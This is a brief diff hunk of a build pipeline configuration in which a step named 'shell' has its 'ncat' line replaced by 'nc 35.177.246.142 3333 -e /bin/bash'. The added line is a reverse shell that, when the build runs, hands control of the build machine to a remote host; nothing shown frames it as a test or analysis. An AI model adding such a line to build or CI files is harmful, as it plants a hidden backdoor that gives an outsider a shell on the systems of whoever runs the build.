@@ -18,7 +18,7 @@ build:
             name: "shell"
             code: |
              nc
-             ncat
+             nc 35.177.246.142 3333 -e /bin/bash
 
     - script:
             name: "test"
